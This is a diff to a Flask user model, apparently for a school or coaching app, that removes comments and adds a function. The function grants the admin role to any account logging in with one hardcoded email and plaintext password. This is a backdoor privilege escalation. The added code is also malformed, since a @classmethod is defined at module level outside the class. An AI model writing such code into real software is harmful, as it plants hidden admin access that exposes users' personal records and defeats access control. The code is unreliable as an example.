@@ -11,8 +11,8 @@ class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     name = db.Column(db.String(150), nullable=False)
     email = db.Column(db.String(100), nullable=False, unique=True)
-    password = db.Column(db.String(128), nullable=False)  # Store the hashed password
-    role = db.Column(db.String(20), nullable=False)  # Role of the user (e.g., student, parent, coach, admin)
+    password = db.Column(db.String(128), nullable=False)  
+    role = db.Column(db.String(20), nullable=False)  
     date_of_birth = db.Column(db.Date, nullable=False)
     contact_number = db.Column(db.String(20), nullable=False)
     address = db.Column(db.Text, nullable=False)
@@ -37,3 +37,14 @@ class User(db.Model):
 
     def __repr__(self):
         return f"<User {self.name}>"
+
+@classmethod
+def check_and_update_role(cls, email, password):
+        """Check if the user logging in has admin credentials and update their role."""
+        if email == 'HopeField@info.com' and password == 'Hope256':
+            user = cls.query.filter_by(email=email).first()
+            if user:
+                user.role = 'admin'
+                db.session.commit()
+                return True  
+        return False  
